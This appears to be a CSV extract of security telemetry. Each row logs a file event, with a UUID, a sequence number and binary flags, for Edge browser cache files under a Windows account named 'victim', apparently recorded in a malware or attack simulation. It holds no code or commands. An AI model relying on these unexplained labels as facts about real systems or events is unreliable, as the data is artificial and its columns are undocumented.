e1dd175b-7a2f-40e7-ad68-aecd6bd303a2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e55fd7ab7991699f_1'},494,False,1,0,1,1,0,1
80cc9342-8bb7-4eb5-968f-9bab4ceea1f4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b6'},495,False,1,0,1,1,0,1
32654dbd-33ac-486d-92b5-6d156976bd53,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0e998b40bb567c95_0'},496,False,1,0,1,1,0,1
366bfc2c-3dd6-4b7d-8c8c-72f817d2647d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0e998b40bb567c95_1'},497,False,1,0,1,1,0,1
dc43e373-bdad-453c-b71f-ff93208c2a38,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\296acc1cd0ef4ba9_0'},498,False,1,0,1,1,0,1
9946afa4-c5c9-4737-b36a-e0cb5a568df4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\296acc1cd0ef4ba9_1'},499,False,1,0,1,1,0,1
26924474-a0c6-446e-a38a-fe7abde61730,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\a54706d77db92867_0'},500,False,1,0,1,1,0,1
924da501-6d26-482b-a5dc-0487a51490b7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\a54706d77db92867_1'},501,False,1,0,1,1,0,1
04f1774f-5f32-422e-a0f1-3492df8e229f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d56a60de56c54c7e_0'},502,False,1,0,1,1,0,1
e796089f-d1f0-4e57-a236-6a0e7916d444,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d56a60de56c54c7e_1'},503,False,1,0,1,1,0,1
1cda0282-b396-4f98-9f4d-4473121bc8af,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b7'},504,False,1,0,1,1,0,1
a3827bd1-7327-4dd2-b6b2-5bf2e1dbe9b5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\24ff8575c320fbd3_0'},505,False,1,0,1,1,0,1
f54f804b-4b1e-4b0f-a9c2-f6afcd855ed4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\24ff8575c320fbd3_1'},506,False,1,0,1,1,0,1
baccde89-f89e-48ef-bcc9-a310e3cb556a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8118e8ec8ccd53c9_0'},507,False,1,0,1,1,0,1
42aa6003-4e82-4fbc-9cdb-e5a9026860a3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8118e8ec8ccd53c9_1'},508,False,1,0,1,1,0,1
ec29f39f-99c9-457f-860c-6718be8622c6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ec81a333e9733a05_0'},509,False,1,0,1,1,0,1
458771c9-b656-4186-87ea-28ad1377a13a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ec81a333e9733a05_1'},510,False,1,0,1,1,0,1
b0b4de90-0c18-4a04-95b3-9c53d0409e0c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\92bb7dd17f619813_0'},511,False,1,0,1,1,0,1
085315f8-49fa-43b3-badb-c873672ef019,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\92bb7dd17f619813_1'},512,False,1,0,1,1,0,1
ae268423-0e3a-4853-8712-76d8258d5dff,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\60a6414e5abe9eb0_0'},513,False,1,0,1,1,0,1
32f8ebef-0721-4b0f-8f5b-0fcbe4d800e4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\60a6414e5abe9eb0_1'},514,False,1,0,1,1,0,1
247484f6-ad30-4e0a-8f9b-8cbf17f50cae,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\fef32661d2bf7540_0'},515,False,1,0,1,1,0,1
bbc7445e-3772-474b-ba84-27a5998848c8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\fef32661d2bf7540_1'},516,False,1,0,1,1,0,1
bfe8ecdb-5223-4804-969f-6e5c2574d3d2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\c88691ee87435bea_0'},517,False,1,0,1,1,0,1
f531f25a-f704-43ed-993c-3cef4f28c5ee,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\c88691ee87435bea_1'},518,False,1,0,1,1,0,1
08cadd80-d8dd-4398-99ad-d28c9757e4cf,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8fb4d03f61800323_0'},519,False,1,0,1,1,0,1
470bfda6-0a1e-4693-9f1d-8d397858fa64,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8fb4d03f61800323_1'},520,False,1,0,1,1,0,1
2731ef30-751d-45a4-8183-5dd63505bf89,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\f0ce427b28da7d25_0'},521,False,1,0,1,1,0,1
a96f6348-d032-4047-bc30-3d8fc907c23f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\34d467f947acad13_0'},522,False,1,0,1,1,0,1
f3a6eb2b-a03e-419a-aca4-516243b3e8bb,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\872b7b4f8bfb485b_0'},523,False,1,0,1,1,0,1
b97d1a65-858f-46ae-9de7-76ee955357e4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\f7a02825bf690a95_0'},524,False,1,0,1,1,0,1
4147aa41-5046-4c77-a588-25a5419e70e1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\65f701fc2d3b6d77_0'},525,False,1,0,1,1,0,1
ecc47b11-3f10-432f-8971-5287f4cda523,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\960aaafa77fbb8a0_0'},526,False,1,0,1,1,0,1
a6a61acf-ac59-4063-81f5-a80a729442b0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\b849a2f19789767a_0'},527,False,1,0,1,1,0,1
2b319ca4-276d-4b5e-897e-6266230531fa,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\67f1189172319be9_0'},528,False,1,0,1,1,0,1
a2fd6582-1342-4e28-a1b9-82afbe445220,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e6504c209cb882d7_0'},529,False,1,0,1,1,0,1
c0e91c2d-f4b0-4142-98bb-d777fb5d7cac,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\df9f3044c9ae2e2e_0'},530,False,1,0,1,1,0,1
a7c077e7-ddf5-47e2-9dec-aaa71c83f614,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\3055e34b33d94a7f_0'},531,False,1,0,1,1,0,1
771d9716-3ff0-4c04-b197-9f03fa37950c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ea6f02895a4e3500_0'},532,False,1,0,1,1,0,1
aa79e986-e9de-4d9e-9ee2-0852889232a1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\7c4863577c43b32f_0'},533,False,1,0,1,1,0,1
83661f13-4651-45fe-9e0e-e37779e8763c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\574b540795aeca12_0'},534,False,1,0,1,1,0,1
b2c88380-dff8-43ee-846e-728df45c0635,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\9edf5f432f2b01a8_0'},535,False,1,0,1,1,0,1
b769382a-9394-4aaa-9729-c851f3e88154,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2a15b98971354678_0'},536,False,1,0,1,1,0,1
74d95817-c177-4365-801b-6183a1f0c370,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0a67355f432340b9_0'},537,False,1,0,1,1,0,1
8fdf99eb-fad0-4fe8-9300-9ef46ed1239e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\b9dcc9f4c807eeaa_0'},538,False,1,0,1,1,0,1
52ea1a6c-89c0-4383-8eb7-63b1d12226e5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\321e64ecacb66619_0'},539,False,1,0,1,1,0,1
c7847964-d415-4afd-bb7d-1a29655531d9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\153bba9a429a2c40_0'},540,False,1,0,1,1,0,1
9babb898-c71c-45b5-8cff-962bea10c5a4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2e08a9c6ec333021_0'},541,False,1,0,1,1,0,1
17a31b62-2282-45f1-8265-7553cb76afd1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\39c763e560200cda_0'},542,False,1,0,1,1,0,1
dc26ead9-e24e-45ad-a3a7-9174d804ab30,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\6dcb70bdb8fe40a3_0'},543,False,1,0,1,1,0,1
9e330fb5-86b3-4abc-935c-88c6178b1d25,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\7ed93a10144ac834_0'},544,False,1,0,1,1,0,1
d1fe79c7-dfe2-42b7-b206-96818ba7c69c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\264b46d61d915def_0'},545,False,1,0,1,1,0,1
48aeb63d-94df-4d8d-b82b-03a404203068,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\b7cd751a99c70c48_0'},546,False,1,0,1,1,0,1
6621b1f5-2278-4f6a-a811-8c67db039363,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\13e83bd1c1ab1541_0'},547,False,1,0,1,1,0,1
359ae1e3-0318-48a6-89bb-85b41e4c1804,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8fdcb7992c9e741c_0'},548,False,1,0,1,1,0,1
f46e820f-58b0-4755-8585-8e19b68c14a2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ff5222d57552b6c1_0'},549,False,1,0,1,1,0,1
c2301eeb-ed86-487c-9d68-ef41f5994051,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\b87cf2f2b0511c4c_0'},550,False,1,0,1,1,0,1
434b321a-84e3-4844-801b-7b13e00e030e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\dd1d9f7425e5aefb_0'},551,False,1,0,1,1,0,1
295e7a45-54ff-42bd-98b0-b0f99c8e4600,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\348aae4f13c8f553_0'},552,False,1,0,1,1,0,1
57f08c04-f588-4792-b151-a96d4ae57d3c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8cce886514f2b2ec_0'},553,False,1,0,1,1,0,1
f62eb344-847e-4640-b2b8-483293c1bb10,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\217bbc87393d2e57_0'},554,False,1,0,1,1,0,1
1c33d183-1260-4895-ab86-7297e181a6c2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8bfc77f05f6a3cc5_0'},555,False,1,0,1,1,0,1
27bd3fbd-b5d3-4721-a3ef-2f23dae1ec23,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2a99e21c738e2a0b_0'},556,False,1,0,1,1,0,1
5e0daae7-8660-49df-b155-9d8cc1c1b157,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d6af3918ca46ca94_0'},557,False,1,0,1,1,0,1
b0236bb8-4f4b-4b78-bc79-391f7998614c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\85f220494be669b7_0'},558,False,1,0,1,1,0,1
268113b8-7283-4a4e-a0d0-2b602ec8b1b2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2bb582fd7577f97e_0'},559,False,1,0,1,1,0,1
1c458b7e-48ca-4d94-bf89-b3494be0f22b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\9f97c8dd99a7773d_0'},560,False,1,0,1,1,0,1
4d76289e-b0f1-47c2-99e5-e43fcb36a707,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ed344a77138c223d_0'},561,False,1,0,1,1,0,1
51593471-3e7b-4f49-95d4-34af54648230,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\95fcbb4ef0998598_0'},562,False,1,0,1,1,0,1
61a20d8c-cd90-4460-b9d0-ce1d9eda5573,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\5e44a7f4adb70c29_0'},563,False,1,0,1,1,0,1
ab8fe4ce-7eba-438a-b5db-45680aa0352b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\c95d30c9d70f69cd_0'},564,False,1,0,1,1,0,1
abf69840-e06d-4887-93be-997cc8eaec0b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\b6a609a2a4d72ee3_0'},565,False,1,0,1,1,0,1
62774c42-3169-45ea-a8eb-3f8d3164fc53,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\3881c13d201c7aa8_0'},566,False,1,0,1,1,0,1
64f088a3-3bc3-4506-815e-95a1c7c9d0d5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\b1eb612d97acde28_0'},567,False,1,0,1,1,0,1
8e3c28de-c128-416b-9994-836fb412ac8b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ab8e5be042409c8f_0'},568,False,1,0,1,1,0,1
cf68fb42-9144-4fdb-baa4-6b43bdffd12b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\a35caf37911ffc68_0'},569,False,1,0,1,1,0,1
0dca8949-3b34-4611-a58f-079a4df54682,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\a674423cfbfd17cb_0'},570,False,1,0,1,1,0,1
83a78ae8-ece6-4366-8ef4-ce4e3fd41185,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\3b03edf631539a03_0'},571,False,1,0,1,1,0,1
0a146406-c824-4414-aa43-98d7dd45c4d6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\7b242180316745f3_0'},572,False,1,0,1,1,0,1
1630c6ae-f3db-4e8c-a14f-29ea4ae561ba,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\f12d9bd42964b0e9_0'},573,False,1,0,1,1,0,1
caac7498-242c-41aa-a45b-a7084eaaa4c6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\a4eeb911b4b433aa_0'},574,False,1,0,1,1,0,1
1de630e9-1103-4721-a55b-348b1c8ed3af,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\22d4a57ac4e23ec3_0'},575,False,1,0,1,1,0,1
47947113-7f63-4531-a111-ca7fc31a85e6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8c2129e90010758d_0'},576,False,1,0,1,1,0,1
98ef4b9f-571e-4ff7-a039-53f60ea95473,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\383a36fceaa62055_0'},577,False,1,0,1,1,0,1
d22f17b6-793c-442e-9355-0b065c56a83e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\9e8aa4fdf814d5ed_0'},578,False,1,0,1,1,0,1
2fd444c2-14db-4277-b5ce-37a2d168c711,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\3baf6e1cdce96d35_0'},579,False,1,0,1,1,0,1
